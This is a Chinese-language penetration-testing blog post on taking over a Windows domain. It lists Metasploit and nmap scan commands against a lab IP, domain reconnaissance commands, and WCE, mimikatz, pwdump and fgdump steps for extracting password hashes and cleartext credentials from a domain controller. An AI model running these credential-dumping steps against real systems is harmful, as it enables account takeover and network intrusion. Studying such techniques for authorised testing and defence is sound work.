


只要有密码 的 hash 值 就能入侵操作系统 而不需要明文密码.


用 wce 工具 在操作系统 提取管理员密码的 hash 值. 

在目标服务器上进入目录wce -l获取管理密码哈希值



Kali 对 网络进行扫描.
发现 开发的端口.




启动 MSF  发现系统版本和补丁信息.

msfconsole
search smb_version
use auxiliary/scanner/smb/smb_version
show options
set RHOST 192.168.3.99
run


对目标进行一次隐秘的端口扫描
db_nmap -sS -Pn 192.168.3.99






内网信息获取
信息的获取直接通过Windows自带的命令即可实现，简单写出来：
ipconfig /all
netstat –an
net start
net user
net user /domain
net group “domain admins”        #查看域管理员
net localgroup administrators
net view /domain
dsquery server         #查看域控服务器
dsquery subnet        #查看域IP范围
上述命令执行完，内网的信息基本上就获取的差不多了。个别命令根据个人爱好请自行增加减。



向域控出发
假设执行dsquery server的结果我们发现域控服务器为DC-2008和DC-2003两台，而我们执行命令的主机也是在域下的，那么我们可以直接WCE -w了，运气好的话明文密码直接出现在你眼前，另一个外国人写的神器叫mimikatz也能够获取明文密码，图我就不截了，大家自己动手吧！

如果运气好，那么恭喜，此时你已经域控管理员密码在手，域中随意可行走。使用域控管理员密码登录域控服务器，使用pwdump、fgdump等各种密码dump工具对整个域控的密码散列进行获取即可。

如果运气差，使用wce没有得到域管理员的密码，那么你可以尝试如下方式：


Incognito
Smb
Wce –s欺骗
Sniffer + ARP
其他（玉在哪里？）


Sniffer动静很大，不到最后建议还是不要尝试了。



结束语
此文仅以技术交流为目的，拒绝任何形式的攻击行为。
想了半天我决定还是在结束语前面加上上面这句话，渗透是个技术活，也是个艺术活，各种奇技妙巧尽在其中，同时环境也复杂多变，但万变不离其宗，以静制动，后发制人。
文章有点虎头蛇尾了，但总算是兑现诺言了。

下一个坑
又给自己挖一个坑，想写点关于SCADA的，但是这东西太… 如果有更好的我会换掉。
